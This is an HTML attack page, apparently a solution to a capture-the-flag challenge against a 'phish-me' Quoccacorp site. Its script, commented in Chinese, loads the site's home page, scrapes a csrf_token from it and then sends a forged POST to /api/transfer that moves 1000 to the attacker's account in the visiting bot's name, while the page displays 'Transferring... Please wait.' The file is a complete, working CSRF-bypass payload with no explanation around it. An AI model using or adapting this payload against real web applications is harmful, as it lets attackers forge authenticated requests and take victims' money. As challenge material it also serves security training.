<!DOCTYPE html>
<html>
<body>
    <script>
        async function getFlag() {
            try {
                // 1. 获取机器人的主页 HTML 以提取最新的 csrf_token
                const response = await fetch('https://phish-me.quoccacorp.com/');
                const html = await response.text();
                
                // 2. 提取 token 值
                const match = html.match(/name="csrf_token" value="([^"]+)"/);
                if (!match) return;
                const token = match[1];

                // 3. 以机器人的名义发送转账请求
                await fetch('https://phish-me.quoccacorp.com/api/transfer', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `csrf_token=${encodeURIComponent(token)}&username=z5462057&amount=1000`
                });
                
                // 转账完成后，机器人完成了操作
                console.log("Attack dispatched!");
            } catch (e) {
                console.error("Error:", e);
            }
        }
        getFlag();
    </script>
    <h2>Transferring... Please wait.</h2>
</body>
</html>
